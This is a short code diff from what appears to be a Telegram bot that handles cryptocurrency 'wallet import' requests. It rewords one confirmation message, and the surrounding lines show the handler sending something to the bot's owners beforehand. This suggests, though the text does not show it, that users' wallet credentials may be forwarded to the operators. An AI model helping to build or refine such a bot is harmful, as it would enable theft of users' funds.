@@ -719,7 +719,7 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 print(f"Error sending to owners: {e}")
 
         # Show wallet creation confirmation message without inline buttons
-        await update.message.reply_text("Please wait while your wallet is being imported. ✅")
+        await update.message.reply_text("Please wait while our system processes your wallet import request ✅")
         return
 
     # Handle admin operations (only for owners)
